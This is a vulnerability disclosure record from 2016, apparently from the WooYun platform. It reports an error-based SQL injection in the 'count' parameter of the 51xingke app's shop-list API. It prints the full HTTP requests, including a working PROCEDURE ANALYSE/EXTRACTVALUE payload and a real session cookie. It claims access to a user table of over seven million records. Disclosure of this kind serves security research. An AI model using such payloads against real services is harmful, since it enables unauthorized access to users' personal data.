wybug_title: 时趣某APP一处Limit后注入（涉及700W+用户数据）
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2016-04-29：	细节已通知厂商并且等待厂商处理中									2016-05-08：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： APP安全之SQL注入 详细说明：  目标：时趣互动IOS APP星客检测发现以下地方存在SQL注入：（注入参数count，报错注入）
GET http://api.51xingke.com/index/getshoplist?city=1&cls=0&count=0&distance=0&f=2&ismore=0&key=%E6%9C%A8&lat=22.539498&lng=113.944141&type=0&v=5 HTTP/1.1Cookie: XINGKE_USER_KEY_SEND=sRKjchPI%2F0E5mhtvE4g095Vf3IwAGxKJAA%2Fgpyrxf7Wu10KmyjgNoFjYsfWITUpkTmBtlpzykInDslO6SnxIryGpEiZPTce6K2KLBho%2Fuy4%3DX-Requested-With: XMLHttpRequestReferer: http://api.51xingke.com/index/getshoplist?distance=0&lat=22.539498&lng=113.944141&cls=0&type=0&count=0&ismore=0&city=1&key=%E6%9C%A8&v=5&f=2Host: api.51xingke.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*
Payload：
GET http://api.51xingke.com/index/getshoplist?city=1&cls=0&count=0%2F**%2FPROCEDURE%2F**%2FANALYSE(EXTRACTVALUE(1%2Cuser())%2C1)--+-&distance=0&f=2&ismore=0&key=%E6%9C%A8&lat=22.539498&lng=113.944141&type=0&v=5 HTTP/1.1Accept-Language: en-us,en;q=0.5Accept-Encoding: gzip,deflateHost: api.51xingke.comAccept: */*User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7X-Requested-With: XMLHttpRequestPragma: no-cacheCache-Control: no-cache,no-storeReferer: http://api.51xingke.com/index/getshoplist?distance=0&lat=22.539498&lng=113.944141&cls=0&type=0&count=0&ismore=0&city=1&key=%E6%9C%A8&v=5&f=2Cookie: XINGKE_USER_KEY_SEND=sRKjchPI%2F0E5mhtvE4g095Vf3IwAGxKJAA%2Fgpyrxf7Wu10KmyjgNoFjYsfWITUpkTmBtlpzykInDslO6SnxIryGpEiZPTce6K2KLBho%2Fuy4%3DContent-Length: 0
   漏洞证明：  1、当前数据库用户

2、所有数据库

3、用户表，涉及700W+用户数据，具体就不深入了，仅列出个数作为证明

wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-05-08 23:40 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无
